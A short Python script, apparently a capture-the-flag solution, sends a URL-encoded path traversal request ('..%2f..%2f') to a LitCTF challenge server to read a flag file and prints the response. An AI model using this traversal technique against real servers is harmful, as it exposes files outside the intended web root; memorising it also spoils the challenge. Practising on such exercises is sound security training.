#!/usr/bin/env python3
import requests

response = requests.get('http://litctf.org:31778/..%2f..%2fapp%2fflag.txt')

print(response.text)
